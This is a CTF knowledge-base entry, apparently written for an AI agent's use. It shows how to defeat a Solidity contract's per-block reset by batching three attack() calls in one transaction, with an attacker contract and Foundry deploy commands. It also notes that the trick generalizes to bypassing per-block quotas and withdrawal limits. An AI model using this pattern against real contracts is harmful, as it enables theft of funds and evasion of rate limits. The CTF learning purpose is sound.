---
id: web3-per-block-reset-batch-in-one-tx
category: WEB
tags: [web3, blockchain, evm, solidity, per-block-reset, regeneration, self-healing, block-timestamp, batch, multicall, same-tx, same-block, attacker-contract, rate-limit-bypass, htb, cyber-apocalypse, eldorion, foundry, cast, web3py, solcx]
tools: [Web3]
manuals: ["Manuals/Web3/3. Contexto para Claude.md"]
title: "Web3 — state that resets per block (regeneration) beaten by batching N actions into a single tx"
difficulty: easy
created: 2026-10-08
updated: 2026-10-08
related: [web3-weak-onchain-randomness-blockhash, web3-reentrancy-checks-effects-interactions]
---

## How to recognize this pattern

- A contract that **resets some state every new block** (health, quota, counter, rate-limit balance)
  via `block.timestamp`/`block.number`, where each individual action isn't enough on its own:
  ```solidity
  modifier eternalResilience() {
      if (block.timestamp > lastAttackTimestamp) {   // new block -> heal
          health = MAX_HEALTH;
          lastAttackTimestamp = block.timestamp;
      }
      _;
  }
  ```
- A prompt like "regenerates", "self-healing", "eternal resilience", "heals every block". The goal
  (`isSolved()`) requires accumulating an effect that the per-block reset undoes between separate txs.
- The reset fires **once per block** (in the `if block.timestamp >`), so **multiple calls within the
  SAME block** only pay the reset once → you can accumulate.

## Method

Reference case: HTB Cyber Apocalypse 2025 — Eldorion. 300 HP, `attack(100)` deals 100, heals every
block. Solution: a contract that calls `attack` **3x in a single tx** (same block) → 300-300=0.

Toolchain: Foundry. See `Manuals/Web3/3. Contexto para Claude.md`.

### Contract that batches the actions (same block)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;
interface IEldorion { function attack(uint256 damage) external; }
contract Slayer {
    IEldorion public target;
    constructor(address _t) { target = IEldorion(_t); }
    function slay() external {
        target.attack(100);
        target.attack(100);
        target.attack(100);   // 3 atomic hits, 1 block, heal only resets on the 1st
    }
}
```

```bash
FORGE=~/.config/.foundry/bin/forge; CAST=~/.config/.foundry/bin/cast
RPC="<rpc>"; PK="<pk>"; TARGET="<Eldorion>"; SETUP="<Setup>"
$FORGE create src/Slayer.sol:Slayer --rpc-url $RPC --private-key $PK --broadcast --constructor-args $TARGET
SLAYER=<"Deployed to:">
$CAST send $SLAYER "slay()" --rpc-url $RPC --private-key $PK      # the 3 calls in one tx
$CAST call $SETUP "isSolved()(bool)" --rpc-url $RPC               # true
```

Grab the flag: the HTB launcher has a TCP interface (menu) — connect and pick the flag option (in
Eldorion it was `3`). Validate the flag against the CTF's configured flag format before declaring success.

### Alternative web3.py + solcx (no Foundry)

The `~/.venvs/web3` + `solcx` toolchain compiles and deploys in-script (what the writeup used):
`compile_source(SOURCE)` → deploy Slayer → `slay()` → read `isSolved()`. Handy when you want everything
in a single Python script.

## Gotchas

- **It has to be 1 tx, not N txs:** sending `attack` 3x as separate txs = 3 blocks = heal between each
  → it never zeroes. The point is the atomicity of the contract call (all in the same block).
- Differs from `web3-weak-onchain-randomness-blockhash`: there the contract is for **atomic correctness**;
  here it's for **batching before the per-block reset**. Same vehicle (attacker contract), different
  reason.
- If the reset uses `block.number` instead of `timestamp`, the reasoning is identical (same block).
- Generalizes: a quota/rate-limit that zeroes per block, "only 1 withdrawal per block" bypassed via a
  self-call, etc.

## Related / Cross-reference

- `Arsenal/WEB/web3-weak-onchain-randomness-blockhash.md` — attacker contract for atomicity.
- `Manuals/Web3/3. Contexto para Claude.md` — `forge`/`cast` and the `instance.json`/launcher flow.
